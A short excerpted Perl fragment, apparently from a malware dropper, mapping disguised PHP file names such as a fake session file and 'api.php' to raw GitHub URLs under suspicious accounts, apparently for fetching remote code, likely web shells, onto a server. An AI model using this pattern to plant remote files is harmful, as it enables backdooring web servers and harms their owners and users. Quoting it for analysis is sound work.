...
my %tmp_files = (
    ...
    "sess_126s1db67aj83e01.php" => "raw.githubusercontent.com/haxserver1/jlkhsdhamnbsuygdamwnbsd/main/get-images.php",
    ...
    "api.php" => "raw.githubusercontent.com/sunokazzu/zuskoa_34/main/api.php",
